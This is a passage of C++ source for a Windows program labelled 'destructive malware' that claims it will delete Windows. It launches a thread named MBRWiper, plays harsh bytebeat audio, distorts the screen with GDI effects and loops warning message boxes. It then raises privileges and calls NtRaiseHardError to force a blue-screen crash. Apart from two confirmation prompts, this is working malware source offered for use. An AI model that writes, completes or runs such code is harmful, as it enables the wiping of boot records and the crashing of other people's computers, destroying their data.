DWORD WINAPI plgblur(LPVOID lpParam)
{
    HDC hdc = GetDC(0);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    BITMAPINFO bmpi = { 0 };
    BLENDFUNCTION blur;
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, NULL, 0, 0);
    SelectObject(hdcCopy, bmp);

    blur.BlendOp = AC_SRC_OVER;
    blur.BlendFlags = 0;
    blur.AlphaFormat = 0;
    blur.SourceConstantAlpha = 10;
    RECT wRect;
    POINT wPt[3];
    while (1)
    {
        hdc = GetDC(0);
        GetWindowRect(GetDesktopWindow(), &wRect);
        wPt[0].x = wRect.left + 100;
        wPt[0].y = wRect.top - 100;
        wPt[1].x = wRect.right + 100;
        wPt[1].y = wRect.top + 0;
        wPt[2].x = wRect.left - 0;
        wPt[2].y = wRect.bottom - 0;
        PlgBlt(hdcCopy, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
        AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blur);
        ReleaseDC(0, hdc);
    }
}

VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 3 * t >> 16) | (t >> 3 * t * (t >> 3 * t >> 4 >> 5) & t >> 24) | (t >> 3 * (t >> 2)));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t + t >> 7 >> t | t * (20 & t | t >> 3 & t >> 1 | t >> 2 >> 3 >> 5));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t & 4096 ? t / 2 * (t ^ t % 255) | t >> 3 : t / 8 | (t & 8192 ? 4 * t : t));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> 1) * (t >> 9 | t >> 3) | (t >> 12 & t >> 9) * (t >> 1);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t * (((114 >> (t >> 25) % 4 & 19) + 19)) / 8 | t / 10) & t / 1 - (t >> 14) % 5 + 14) - t / 191 + 98);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t * (((114 >> (t >> 25) % 4 & 19) + 19)) / 8 | t / 10) & t / 1 - (t >> 14) % 5 + 14) - t / 191 + 98);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(3 * (t >> 8 | t - t | t));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI msg(LPVOID lpParam)
{
    while (1)
    {
        MessageBoxW(NULL,
            L"R.I.P WINDOWS!",
            L"yuki aim.exe",
            MB_OK | MB_ICONWARNING);

        Sleep(1000);
    }

    return 0;
}

int main() {
    if (MessageBoxW(NULL, L"This destructive malware will delete Windows, run?", L"yuki aim.exe by VietNamLover (name by yuki aim [Clutterxmodz])", 
                    MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
    
    if (MessageBoxW(NULL, L"Are you sure to destroy your PC?", 
                    L"yuki aim.exe - 2nd warning", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
            CreateThread(0, 0, MBRWiper, 0, 0, 0);
            Sleep(10);
		    HANDLE msgthread = CreateThread(0, 0, msg, 0, 0, 0);
            Sleep(10);
            sound1();
            HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
            Sleep(30000);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            
            sound2();
            HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
            HANDLE thread2dot1 = CreateThread(0, 0, Tesseract, 0, 0, 0);
            Sleep(30000);
            TerminateThread(thread2, 0);
            CloseHandle(thread2);
            InvalidateRect(0, 0, 0);
            
            sound3();
            HANDLE thread3 = CreateThread(0, 0, blur1, 0, 0, 0);
            Sleep(30000);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            InvalidateRect(0, 0, 0);
            
            sound4();
            HANDLE thread4 = CreateThread(0, 0, shader3, 0, 0, 0);
            Sleep(30000);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            InvalidateRect(0, 0, 0);
            
            sound5();
            HANDLE thread5 = CreateThread(0, 0, glitc, 0, 0, 0);
            HANDLE thread5dot1 = CreateThread(0, 0, sq, 0, 0, 0);
            Sleep(30000);
            TerminateThread(thread5, 0);
            CloseHandle(thread5);
            TerminateThread(thread5dot1, 0);
            CloseHandle(thread5dot1);
            InvalidateRect(0, 0, 0);
            Sleep(10);
            
            sound6();
            HANDLE thread6 = CreateThread(0, 0, shake, 0, 0, 0);
            HANDLE thread6dot1 = CreateThread(0, 0, darker, 0, 0, 0);
            HANDLE thread6dot2 = CreateThread(0, 0, textz1, 0, 0, 0);
            Sleep(30000);
            TerminateThread(thread6, 0);
            CloseHandle(thread6);
            TerminateThread(thread6dot1, 0);
            CloseHandle(thread6dot1);
            InvalidateRect(0, 0, 0);
            
            sound7();
            HANDLE thread7 = CreateThread(0, 0, plgblur, 0, 0, 0);
            Sleep(30000);
            TerminateThread(thread2dot1, 0);
            CloseHandle(thread2dot1);
            TerminateThread(thread6dot2, 0);
            CloseHandle(thread6dot2);
            TerminateThread(thread7, 0);
            CloseHandle(thread7);
            InvalidateRect(0, 0, 0);
            Sleep(1000);

			// ========== BSOD TRIGGER (FINAL BLOW) ==========
            BOOLEAN bl;
            DWORD response;
            NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
            RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
            RtlAdjustPrivilege(19, 1, 0, &bl);
            NtRaiseHardError(0xC0000251, 0, 0, 0, 6, &response);

    Sleep(-1);
}